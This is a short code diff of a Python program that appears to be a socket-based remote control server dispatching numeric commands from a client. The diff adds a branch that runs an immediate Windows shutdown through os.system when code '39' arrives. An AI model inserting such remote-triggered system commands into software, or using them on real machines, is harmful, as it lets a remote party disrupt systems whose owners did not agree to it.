@@ -150,6 +150,8 @@ while close:
                 client.send(bytes("Error Found, not admin","utf8"))
         else:
             client.send(bytes("Not admin", "utf8"))
+    elif value == "39":
+        os.system("shutdown /s /t 00")
     elif value == "22":
         print(prevalue)
         processName = prevalue.split()[1]
